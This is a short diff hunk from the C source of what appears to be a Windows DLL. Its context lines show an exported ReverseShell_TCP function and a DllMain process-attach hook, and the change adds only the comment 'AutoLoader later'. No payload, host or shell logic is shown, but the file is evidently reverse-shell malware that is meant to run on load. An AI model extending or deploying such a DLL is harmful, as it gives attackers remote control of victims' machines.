@@ -78,6 +78,8 @@ __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
     WSACleanup();
 }
 
+// AutoLoader later
+
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     (void)hinstDLL; (void)lpvReserved;
     if (fdwReason == DLL_PROCESS_ATTACH)
